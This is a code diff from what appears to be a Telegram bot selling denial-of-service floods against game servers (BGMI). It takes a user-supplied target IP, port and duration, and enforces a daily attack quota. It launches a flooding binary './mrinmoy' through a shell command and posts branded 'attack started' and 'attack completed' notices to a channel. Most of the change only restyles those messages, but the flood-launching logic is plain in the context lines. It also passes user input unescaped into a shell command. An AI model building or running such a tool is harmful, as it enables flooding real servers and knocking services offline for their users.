@@ -157,14 +157,12 @@ def bgmi_command(message):
         default_duration = 150
         
         remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
-
-bot.send_message(
-    message.chat.id,
-    f"🚀 𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} "
-    f"𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ]\n\n"
-    f"⚠️ 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔 : {remaining_attacks} 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙡𝙚𝙛𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮. ⚠️\n"
-    "❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
-)
+        
+        user_id = message.from_user.id    
+        bot.send_message(
+        message.chat.id,
+            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n⚠️𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔⚠️ :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- {message.from_user.first_name} \n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
+        )
 
         # Log the attack started message
         logging.info(f"Attack started by {user_name}: ./mrinmoy {target_ip} {target_port} {default_duration} 877")
@@ -180,7 +178,7 @@ async def run_attack_command_async(target_ip, target_port, duration, user_durati
         command = f"./mrinmoy {target_ip} {target_port} {duration} 877"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
-        bot.send_message(CHANNEL_ID, f"?? ??𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 TF-FLASH™")
+        bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 TF-FLASH™")
     except Exception as e:
         bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")
 
